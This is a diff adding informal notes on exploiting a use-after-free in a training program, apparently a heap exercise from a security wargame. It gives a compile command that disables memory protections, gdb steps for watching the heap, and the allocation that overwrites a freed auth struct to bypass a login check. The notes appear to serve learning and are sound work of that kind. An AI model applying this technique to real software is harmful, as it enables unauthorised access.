@@ -1,0 +1,42 @@
+The idea behind the exploit is:
+1.Create an auth struct
+2.Free the heap space it was assigned to
+3.Overwrite that space using the strdup() call
+4.Login successfully if we overwrote the location it expects to find the int 'auth' in the struct
+
+Compile Command:
+gcc -g -O0 -mpreferred-stack-boundary=2 -m32 -fno-stack-protector -z exectstack -D_FORTIFY_SOURCE=0 heap.c -o heap.o
+
+Steps Taken:
+run program (run)
+From the above command auth will be (nil)
+continue in the loop this time adding an auth input (auth whatever)
+From the above command we can see the auth address
+CTRL+C to interrupt the loop
+check location of heap (info proc mappings)
+display memory area for heap (x/20wx 0xHEAPADDRESS)
+display where struct auth is (print auth)
+display contents of auth (print *auth)
+disassemble and set a breakpoint at the printf line
+create a custom command at this breakpoint (command)
+Use the following lines as contents:
+echo --------HEAP-------\n
+x/40wx HEAPADDRESS
+echo --------AUTH-------\n
+print *auth
+echo -------SERVICE-----\n
+print service
+echo -------------------\n
+continue
+end
+
+run the program again, should see an error
+assign a value to auth
+edit the x/40wx in the "command" to contain the address of the heap
+x/40wx 0x804b000 became 0x804b800 as heap address was 0x804b818
+use the reset command
+we can see where we before had the values for auth in front of 0x00000011 it has now been cleared
+now we can allocate service (serviceAAAABBBB) and a few other variants
+We can see the newly allocated memory and is we try the (login) command we should see the you have already logged in message
+
+
